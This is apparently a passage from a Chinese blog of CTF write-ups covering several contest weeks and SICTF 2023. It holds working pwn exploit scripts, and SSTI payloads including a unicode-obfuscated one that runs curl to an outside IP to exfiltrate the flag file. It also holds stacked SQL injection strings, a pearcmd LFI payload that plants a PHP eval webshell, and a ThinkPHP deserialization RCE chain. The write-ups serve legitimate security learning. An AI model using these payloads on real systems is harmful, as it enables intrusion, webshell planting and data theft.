<p>将原base64表中的+/换成了$&amp;，并将顺序打乱，形成了一个叫alphabet的表，按这个表编码了明文，在base64中用于填充的“=”这里也被换成了“%”。</p>
<h1 id="week2pwn">WEEK2|PWN</h1>
<h2 id="砍一刀">砍一刀</h2>
<p>exp如下</p>
<pre><code class="hljs plaintext">from pwn import *
context(arch = &quot;amd64&quot;, os = &quot;linux&quot;, log_level = &quot;debug&quot;)
p = remote(&#x27;node4.buuoj.cn&#x27;,26132)
#p = process(&#x27;./kan&#x27;)
#gdb.attach(p, &#x27;&#x27;)
payload=fmtstr_payload(8,&#123;0x0404090:0xA&#125;)
while(1):
    x=p.recv()
    if &quot;回车&quot;.encode() in x:
        p.send(b&#x27;\n&#x27;)
    if b&quot;666&quot; in x:
        p.sendline(b&#x27;666&#x27;)
    if &quot;输入口令=&quot;.encode() in x:
        p.send(payload)
        break
    sleep(0.5)
    
p.sendline(b&#x27;cat flag&#x27;)
p.interactive()
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021902041.png?x-oss-process=hzy" alt="image-20221002190248956"></p>
<p>flag{e796196b-280a-4018-a16c-0ef92a951bad}</p>
<h2 id="shellcode-revenge">shellcode-revenge</h2>
<p>exp如下</p>
<pre><code class="hljs plaintext">from pwn import *
context(arch = &quot;amd64&quot;, os = &quot;linux&quot;, log_level = &quot;debug&quot;)
p = remote(&#x27;node4.buuoj.cn&#x27;,28308)
#p = process(&#x27;./shellc&#x27;)
#gdb.attach(p, &#x27;&#x27;)
p.recvuntil(&#x27;little.\n&#x27;)
addr=0x233000

pd = asm(shellcraft.amd64.read(0,0x233050,0x50))
sc = &#x27;&#x27;&#x27;
    mov esp, 0x233050
    ret
&#x27;&#x27;&#x27;
sc = asm(sc)
pd += sc

payload=asm(shellcraft.cat(&#x27;flag&#x27;))

payload=asm(shellcraft.read(0,0x233000,0x30))+asm(&quot;sub rsp,0x30;jmp rsp&quot;)

&#x27;&#x27;&#x27;
payload = shellcraft.open(&quot;flag&quot;)
payload += shellcraft.sendfile(1,3, 0x30)
&#x27;&#x27;&#x27;
p.send(pd)


p.recvuntil(&#x27;time~\n&#x27;)
p.sendline(flat(&#123;
    56: p64(0x233000)
&#125;))

p.recvuntil(&#x27;\n&#x27;)
payload2 = shellcraft.open(&quot;flag&quot;)
payload2 += shellcraft.read(3, addr, 0x30)
payload2 += shellcraft.write(1,addr, 0x30)
p.send(p64(0x233058) + asm(shellcraft.cat(&#x27;flag&#x27;)))


p.interactive()
</code></pre>
<p>flag{ad06e958-d7a8-45cb-92e5-624ea8337797}</p>
<h2 id="buffer-fly">buffer-fly</h2>
<p>exp如下</p>
<pre><code class="hljs plaintext">#!/usr/bin/env python3
# coding = utf-8

from pwn import *
from LibcSearcher import *
context(arch = &quot;amd64&quot;, os = &quot;linux&quot;, log_level = &quot;debug&quot;)

#p = process(&#x27;./bf&#x27;)
p = remote(&#x27;node4.buuoj.cn&#x27;, 27967)
elf = ELF(&#x27;./bf&#x27;)
#gdb.attach(p, &#x27;&#x27;)

puts_got = elf.got[&#x27;puts&#x27;]
puts_plt = elf.plt[&#x27;puts&#x27;]
print(hex(elf.plt[&#x27;system&#x27;]))

p.recvuntil(&#x27;name:&#x27;)
p.sendline()
p.recvline()
base_addr=(u64(p.recvline()[:-1].ljust(8, b&#x27;\x00&#x27;))&gt;&gt;4)
print(base_addr)
p.recvuntil(&#x27;age:&#x27;)
p.send(b&#x27;a&#x27;*0x20)
p.recvuntil(b&#x27;a&#x27;*0x20)
stack_addr=(u64(p.recvline()[:-1].ljust(8, b&#x27;\x00&#x27;)))
print(stack_addr)

p.recvuntil(&#x27;number:&#x27;)
p.send(b&#x27;sh flag&#x27;+b&#x27;\x00&#x27;*33+p64((base_addr&lt;&lt;12)+0x423)+p64(stack_addr-0x30)+p64((base_addr&lt;&lt;12)+0x29D))
#pop_rdi buf_addr system

p.interactive()

#0x7ffef2cfae70</code></pre>
<p>flag{b3c0me_4_butt3rf1y}</p>
<h2 id="uint32-and-ret">uint32 and ret</h2>
<p>无符号型整数溢出</p>
<p>exp如下</p>
<pre><code class="hljs plaintext">#!/usr/bin/env python3
# coding = utf-8

from pwn import *
from LibcSearcher import *
context(arch = &quot;amd64&quot;, os = &quot;linux&quot;, log_level = &quot;debug&quot;)


p = remote(&#x27;node4.buuoj.cn&#x27;, 29442)
#p = process(&#x27;./uint&#x27;)
#gdb.attach(p, &#x27;&#x27;)



p.recvuntil(&#x27;success!&#x27;)
p.sendline(str(49))
p.recvuntil(&#x27;twice\n&#x27;)
p.send(b&#x27;a&#x27;*88+p64(0x04011BE))

p.interactive()
</code></pre>
<p>flag{03a739c9-8ed5-42ea-8c0d-a9bfe22c2d80}</p>
<h1 id="week3misc">WEEK3|MISC</h1>
<h2 id="whats-http">Whats HTTP</h2>
<blockquote>
<p>这是什么东西？好像是HTTP，WireShark看看吧</p>
</blockquote>
<p>pcap文件，流量分析</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171252305.png?x-oss-process=hzy" alt="image-20221017125252221"></p>
<pre><code class="hljs plaintext">NjY2YzYxNjc3YjM0NjYzMzMzMzYzNDM5NjQzMDMzMzA2MzM2MzczNzM4MzQzMjM2MzkzNzMxNjIzNTM0NjQ2NDM3MzI2NTYzNjU3ZA==</code></pre>
<p>base64+hex转str</p>
<p>flag{4f33649d030c6778426971b54dd72ece}</p>
<h2 id="qsdzs-girlfriend-3">qsdz’s girlfriend 3</h2>
<blockquote>
<p>我们入侵了qsdz的服务器，你可以在服务器中找到他真实的女朋友吗？qsdz的用户密码是Hikari（请用SSH连接）</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171300808.png?x-oss-process=hzy" alt="image-20221017130050730"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171302229.png?x-oss-process=hzy" alt="image-20221017130232168"></p>
<p>flag{cf737bea-e1bb-4e22-b277-e90ba0fb4cc3}</p>
<h1 id="week3web">WEEK3|WEB</h1>
<h2 id="babyssti_one">BabySSTI_One</h2>
<h3 id="法一">法一</h3>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091625116.png?x-oss-process=hzy" alt="image-20221009162524984"></p>
<p>ssti,验证一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091625363.png?x-oss-process=hzy" alt="image-20221009162559293"></p>
<pre><code class="hljs plaintext">?name=&#123;&#123;self.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091626095.png?x-oss-process=hzy" alt="image-20221009162638018"></p>
<p>发现有waf，用a.<strong>getattribute</strong>(‘<strong>i’+'nit</strong>’)替代一下init</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091630220.png?x-oss-process=hzy" alt="image-20221009163044132"></p>
<p>cat的时候发现被过滤了，nl，tac都不行</p>
<p>使用tail加通配符绕过成功读取flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091631532.png?x-oss-process=hzy" alt="image-20221009163137458"></p>
<p>flag{7490019b-4f30-47e1-8de2-4f86b775969d}</p>
<h3 id="法二">法二</h3>
<p>这个解法很通用，遇到ssti过滤一堆的时候可以试试这个方法，curl外带flag</p>
<pre><code class="hljs plaintext">&#123;%for%0ai%0ain%0a&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u006d\u0072\u006f\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(1)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()%&#125;&#123;%%0aif%0a(i|attr(&quot;\u005f\u005f\u006e\u0061\u006d\u0065\u005f\u005f&quot;))==&quot;\u0063\u0061\u0074\u0063\u0068\u005f\u0077\u0061\u0072\u006e\u0069\u006e\u0067\u0073&quot;%0a%&#125;&#123;%%0aif%0a(i|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://43.143.195.203:7777 -d `cat /f*`&#x27;).read()&quot;)%&#125;&#123;%%0aendif%0a%&#125;&#123;%%0aendif%0a%&#125;&#123;%%0aendfor%0a%&#125;</code></pre>
<p>unicode编码之后无敌</p>
<pre><code class="hljs plaintext">&#123;%for%0ai%0ain%0a&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u006d\u0072\u006f\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(1)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()%&#125;&#123;%%0aif%0a(i|attr(&quot;\u005f\u005f\u006e\u0061\u006d\u0065\u005f\u005f&quot;))==&quot;\u0063\u0061\u0074\u0063\u0068\u005f\u0077\u0061\u0072\u006e\u0069\u006e\u0067\u0073&quot;%0a%&#125;&#123;%%0aif%0a(i|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0063\u0075\u0072\u006c\u0020\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0034\u0033\u002e\u0031\u0034\u0033\u002e\u0031\u0039\u0035\u002e\u0032\u0030\u0033\u003a\u0037\u0037\u0037\u0037\u0020\u002d\u0064\u0020\u0060\u0063\u0061\u0074\u0020\u002f\u0066\u002a\u0060\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;)%&#125;&#123;%%0aendif%0a%&#125;&#123;%%0aendif%0a%&#125;&#123;%%0aendfor%0a%&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161658232.png?x-oss-process=hzy" alt="image-20221016165830122"></p>
<p>flag{37907047-a506-459b-985b-37f2d6c76190}</p>
<p>参考</p>
<p>[<a href="https://pysnow.cn/archives/207/">_(:3」」还是被发现了 (pysnow.cn)</a>](<a href="https://pysnow.cn/archives/453/">https://pysnow.cn/archives/453/</a>)</p>
<h2 id="multisql">multiSQL</h2>
<p>sql注入，题目提示是堆叠注入</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091638870.png?x-oss-process=hzy" alt="image-20221009163821784"></p>
<p>and貌似是被过滤了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091639035.png?x-oss-process=hzy" alt="image-20221009163931968"></p>
<p>or可以</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091639669.png?x-oss-process=hzy" alt="image-20221009163945610"></p>
<p>题目说了一点提示</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091640343.png?x-oss-process=hzy" alt="image-20221009164026789"></p>
<p>fuzz之后发现union.select,upadate等等都被过滤了</p>
<p>堆叠注入使用1’;show tables;#，</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091642006.png?x-oss-process=hzy" alt="image-20221009164244937"></p>
<p>1’;show columns from score;#</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091643944.png?x-oss-process=hzy" alt="image-20221009164332865"></p>
<p>1’;replace into score values(“火华”,10000,200,200);#</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091644431.png?x-oss-process=hzy" alt="image-20221009164442361"></p>
<p>删除低分</p>
<p><strong>1’;delete from score where listen=11;#</strong></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091645201.png?x-oss-process=hzy" alt="image-20221009164533144"></p>
<p>修改之后验证得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210091645865.png?x-oss-process=hzy" alt="image-20221009164542811"></p>
<p>flag{Ju3t_use_mo2e_t2en_0ne_SQL}</p>
<h2 id="includetwo">IncludeTwo</h2>
<blockquote>
<p>How to RCE via LFI? P…</p>
</blockquote>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!
if(!preg_match(&quot;/base64|rot13|filter/i&quot;,$_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[&#x27;file&#x27;]))&#123;
    include($_GET[&#x27;file&#x27;].&quot;.php&quot;);
&#125;else&#123;
    die(&quot;Hacker!&quot;);
&#125; Hacker!</code></pre>
<p>只能包含php文件，还需要RCE</p>
<p>使用pear.cmd</p>
<pre><code class="hljs plaintext">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1])?&gt;+/var/www/html/1.php</code></pre>
<p>本来用hackbar一直不行，能传上去🐎但是不能用，然后用bp就可以了，应该是编码缘故吧</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161719868.png?x-oss-process=hzy" alt="image-20221016171943756"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161719625.png?x-oss-process=hzy" alt="image-20221016171910199"></p>
<p>flag{f12c8806-82c8-4ac3-bfb5-8cdf6c926dd4}</p>
<h2 id="maybe-you-have-to-think-more">Maybe You Have To think More</h2>
<blockquote>
<p>PHP反序列化漏洞系列第二题。想啊想啊想不到，这可不是SQL注入哦～～～</p>
</blockquote>
<blockquote>
<p>hint；看看Cookie ThinkPHP 5框架反序列化RCE</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161721952.png?x-oss-process=hzy" alt="image-20221016172150885"></p>
<p>随便输入制造报错发现是thinkphp5.1.41</p>
<p>image-20221016172242171</p>
<p>主界面还给了一个输入传参框，对于thinkphp遇到输入框多半就是反序列化</p>
<p>直接在网上搜一个payload</p>
<p><a href="https://blog.csdn.net/rfrder/article/details/113843768">https://blog.csdn.net/rfrder/article/details/113843768</a></p>
<pre><code class="hljs plaintext">&lt;?php
namespace think\process\pipes&#123;

    use think\model\Pivot;

    class Windows
    &#123;
        private $files = [];
        public function __construct()&#123;
            $this-&gt;files[]=new Pivot();
        &#125;
    &#125;
&#125;
namespace think&#123;
    abstract class Model
    &#123;
        protected $append = [];
        private $data = [];
        public function __construct()&#123;
            $this-&gt;data=array(
              &#x27;huang&#x27;=&gt;new Request()
            );
            $this-&gt;append=array(
                &#x27;huang&#x27;=&gt;array(
                    &#x27;hello&#x27;=&gt;&#x27;world&#x27;
                )
            );
        &#125;
    &#125;
&#125;
namespace think\model&#123;

    use think\Model;

    class Pivot extends Model
    &#123;

    &#125;
&#125;
namespace think&#123;
    class Request
    &#123;
        protected $hook = [];
        protected $filter;
        protected $config = [
            // 表单请求类型伪装变量
            &#x27;var_method&#x27;       =&gt; &#x27;_method&#x27;,
            // 表单ajax伪装变量
            &#x27;var_ajax&#x27;         =&gt; &#x27;&#x27;,
            // 表单pjax伪装变量
            &#x27;var_pjax&#x27;         =&gt; &#x27;_pjax&#x27;,
            // PATHINFO变量名 用于兼容模式
            &#x27;var_pathinfo&#x27;     =&gt; &#x27;s&#x27;,
            // 兼容PATH_INFO获取
            &#x27;pathinfo_fetch&#x27;   =&gt; [&#x27;ORIG_PATH_INFO&#x27;, &#x27;REDIRECT_PATH_INFO&#x27;, &#x27;REDIRECT_URL&#x27;],
            // 默认全局过滤方法 用逗号分隔多个
            &#x27;default_filter&#x27;   =&gt; &#x27;&#x27;,
            // 域名根，如thinkphp.cn
            &#x27;url_domain_root&#x27;  =&gt; &#x27;&#x27;,
            // HTTPS代理标识
            &#x27;https_agent_name&#x27; =&gt; &#x27;&#x27;,
            // IP代理获取标识
            &#x27;http_agent_ip&#x27;    =&gt; &#x27;HTTP_X_REAL_IP&#x27;,
            // URL伪静态后缀
            &#x27;url_html_suffix&#x27;  =&gt; &#x27;html&#x27;,
        ];
        public function __construct()&#123;
            $this-&gt;hook[&#x27;visible&#x27;]=[$this,&#x27;isAjax&#x27;];
            $this-&gt;filter=&quot;system&quot;;
        &#125;
    &#125;
&#125;
namespace&#123;

    use think\process\pipes\Windows;

    echo base64_encode(serialize(new Windows()));
&#125;
</code></pre>
<pre><code class="hljs plaintext">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJodWFuZyI7YToxOntzOjU6ImhlbGxvIjtzOjU6IndvcmxkIjt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6NToiaHVhbmciO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6ODtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxMDp7czoxMDoidmFyX21ldGhvZCI7czo3OiJfbWV0aG9kIjtzOjg6InZhcl9hamF4IjtzOjA6IiI7czo4OiJ2YXJfcGpheCI7czo1OiJfcGpheCI7czoxMjoidmFyX3BhdGhpbmZvIjtzOjE6InMiO3M6MTQ6InBhdGhpbmZvX2ZldGNoIjthOjM6e2k6MDtzOjE0OiJPUklHX1BBVEhfSU5GTyI7aToxO3M6MTg6IlJFRElSRUNUX1BBVEhfSU5GTyI7aToyO3M6MTI6IlJFRElSRUNUX1VSTCI7fXM6MTQ6ImRlZmF1bHRfZmlsdGVyIjtzOjA6IiI7czoxNToidXJsX2RvbWFpbl9yb290IjtzOjA6IiI7czoxNjoiaHR0cHNfYWdlbnRfbmFtZSI7czowOiIiO3M6MTM6Imh0dHBfYWdlbnRfaXAiO3M6MTQ6IkhUVFBfWF9SRUFMX0lQIjtzOjE1OiJ1cmxfaHRtbF9zdWZmaXgiO3M6NDoiaHRtbCI7fX19fX19</code></pre>
<p>传之后得到cookie复制过来之后直接命令执行</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171207373.png?x-oss-process=hzy" alt="image-20221017120733658"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171208816.png?x-oss-process=hzy" alt="image-20221017120806743"></p>
<p>没找到真的flag，看环境变量发现flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171212296.png?x-oss-process=hzy" alt="image-20221017121232206"></p>
<p>flag{b11a41fd-3c21-4922-9d1c-548c6175b490}</p>
<h1 id="week4web">WEEK4|WEB</h1>
<h2 id="babyssti_two复现">BabySSTI_Two(复现)</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171214020.png?x-oss-process=hzy" alt="image-20221017121442922"></p>
<p>还是ssti</p>
<p>但是上一题ssti那个方法里面有字符被过滤了</p>
<pre><code class="hljs plaintext">&#123;&#123;url_for.__getitem__[&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;][&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;][&#x27;\u0065\u0076\u0061\u006c&#x27;](&#x27;这里填写eval函数的内容，然后用unicode编码一下就行&#x27;)&#125;&#125;</code></pre>
<pre><code class="hljs plaintext">&#123;&#123;url_for.__getitem__[&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;][&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;][&#x27;\u0065\u0076\u0061\u006c&#x27;](&#x27;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u005f\u0069\u006e\u005f\u0068\u0033\u0072\u0033\u005f\u0035\u0032\u0064\u0061\u0061\u0064\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&#x27;)&#125;&#125;</code></pre>
<p>flag{c97b90f3-4ad7-4f24-a306-305157265b7d}</p>
<h2 id="so-baby-rce">So Baby RCE</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
if(isset($_GET[&quot;cmd&quot;]))&#123;
    if(preg_match(&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;,$_GET[&quot;cmd&quot;]))&#123;
       echo &quot;Don&#x27;t Hack Me&quot;;
    &#125;else&#123;
        system($_GET[&quot;cmd&quot;]);
    &#125;
&#125;else&#123;
    show_source(__FILE__);
&#125;</code></pre>
<p>绕过之后命令执行</p>
<p>知道题目空格用${IFS}代替，/用%0a代替即可绕过执行rce</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171219513.png?x-oss-process=hzy" alt="image-20221017121942431"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210171234891.png?x-oss-process=hzy" alt="image-20221017123411804"></p>
<blockquote>
<p>在这道题目里可以用%0a即回车键代替&amp;&amp;，同时也可以把&amp;url编码使用，读取flag使用sort，同时用？通配符绕过过滤</p>
</blockquote>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SICTF 2023</title>
    <url>/2023/01/19/SICTF/</url>
    <content><![CDATA[<p>SICTF 2023</p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>队友很给力，第九，web这次AK了，也学到了很多，整挺好</p>
<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119173040742.png?x-oss-process=hzy" alt="image-20230119173040742" style="zoom:150%;">
<h1 id="misc">Misc</h1>
<h2 id="签到打卡完成">签到打卡完成</h2>
<blockquote>
<p>听说,这个签到题扫码关注公众号回复一个特定的“Key”就可以拿到Flag，出题人把Key也藏在题目中了。</p>
</blockquote>
<p>二维码扫码关注公众号，发送SICTF得到flag</p>
<p>SICTF{fb23cefd-487f-42dd-a343-2a06194efc60}</p>
<h2 id="hacker">Hacker</h2>
<blockquote>
<p>树木是个大黑客，经过调查，在一次玩靶场的过程中，喜欢兔子的他把flag藏在了根目录的tmp目录下，我们截取了他回头查看flag时的流量，你能找到他藏起来的flag并进行解密吗？</p>
</blockquote>
<p>流量分析</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230116135328834.png?x-oss-process=hzy" alt="image-20230116135328834"></p>
<p>最后这个数据base64解密【这地方有个坑就是前面的数字要删掉要不然解码的时候就是乱码】</p>
<pre><code class="hljs plaintext">aa8aVTJGc2RHVmtYMTliRU4zRDh2RmVHMzlWeVlYUHdsZTJtTVFMaDVUMUhZaVNJMVhDeDdySmhzRG5wOXFMcFVRQg0KeUlUZDA1VXUwNVpBdjBvPWUyNjRjNTViZQovdG1wCmE3ZWIzZGY4NzRlCg==ab05b5</code></pre>
<pre><code class="hljs plaintext">iU2FsdGVkX19bEN3D8vFeG39VyYXPwle2mMQLh5T1HYiSI1XCx7rJhsDnp9qLpUQB
yITd05Uu05ZAv0o=e264c55be
/tmp
a7eb3df874e</code></pre>
<pre><code class="hljs plaintext">U2FsdGVkX19bEN3D8vFeG39VyYXPwle2mMQLh5T1HYiSI1XCx7rJhsDnp9qLpUQB
yITd05Uu05ZAv0o=e264c55be//这个就是rabbit加密特征，找密码</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230116135557179.png?x-oss-process=hzy" alt="image-20230116135557179"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230116135603259.png?x-oss-process=hzy" alt="image-20230116135603259"></p>
<p>得到密码是Gui_1s_shumu</p>
<p>解密得到flag</p>
<p>SICTF{50da673c-3b59-4a6f-81da-79cba7eb63b1}</p>
<h2 id="color">color</h2>
<blockquote>
<p>这些毫无规律的颜色中隐藏着怎样的小世界呢？</p>
</blockquote>
<p>题目附件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118162535354.png?x-oss-process=hzy" alt="image-20230118162535354"></p>
<p>丢stegsolve里改变通道，反复在Random colour map 2与Random colour map 3之间调动，直至出现如下图所示能够清楚显示二维码的图像</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118162826846.png?x-oss-process=hzy" alt="image-20230118162826846"></p>
<p>保存之后继续拖进去改</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118162938899.png?x-oss-process=hzy" alt="image-20230118162938899"></p>
<p>扫码得到flag</p>
<p>SICTF{448e8531-c752-4847-ae7e-0e702a8fb915}</p>
<h2 id="geek_challenge">geek_challenge</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118163218227.png?x-oss-process=hzy" alt="image-20230118163218227"></p>
<p>就是算术题，写个交互一直算就行了</p>
<blockquote>
<p>这里科普一下之前没了解过eval函数功能原来如此强大，它可以执行一切返回表达式并计算出结果</p>
<p>官方解释为：将字符串str当成有效的表达式来求值并返回计算结果</p>
</blockquote>
<blockquote>
<p>eval(‘pow(2,2)’)<br>
4<br>
eval(‘2 + 2’)<br>
4<br>
eval(“n + 4”)<br>
85</p>
</blockquote>
<p>exp如下</p>
<pre><code class="hljs plaintext">from pwn import *
context.log_level = &quot;debug&quot;
io = remote(&#x27;ctf.qsnctf.com&#x27;,10995)
while True:
    res = io.recvline()
    if b&#x27; = ?&#x27; in res:
        a = res[:-5]
        b = str(eval(a))
        io.sendline(b)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118164213360.png?x-oss-process=hzy" alt="image-20230118164213360"></p>
<p>SICTF{dbe40b4a-1102-4226-a1d3-a64c9819904f}</p>
<h2 id="hacker2">hacker2</h2>
<blockquote>
<p>题目描述：树木不小心把重要的信息放在了自己的shell当中，或许对你的解密会有帮助</p>
</blockquote>
<blockquote>
<p>大黑客树木再次上传了shell并用工具进行连接，他在上传目录的一堆测试txt中找到了重要的字符串，我们观察并截取了流量<br>
你能告诉我们他上传的shell的名称和key值以及最终找到的重要字符串吗？<br>
flag格式：SICTF{shell名称_密钥_文本文件中存储的字符串}</p>
</blockquote>
<p>打开pcapng文件，过滤http流</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118165219035.png?x-oss-process=hzy" alt="image-20230118165219035"></p>
<p>找到shell名称：she1l</p>
<p>追踪tcp流查看</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118165239512.png?x-oss-process=hzy" alt="image-20230118165239512"></p>
<p>得到密钥7d7c23e87b47368b</p>
<p>流量具有冰蝎流量特征，继续寻找AES</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118165304958.png?x-oss-process=hzy" alt="image-20230118165304958"></p>
<p>解密AES</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118165316945.png?x-oss-process=hzy" alt="image-20230118165316945"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118165325873.png?x-oss-process=hzy" alt="image-20230118165325873"></p>
<p>这里查看了当前目录所有文件，再往下看</p>
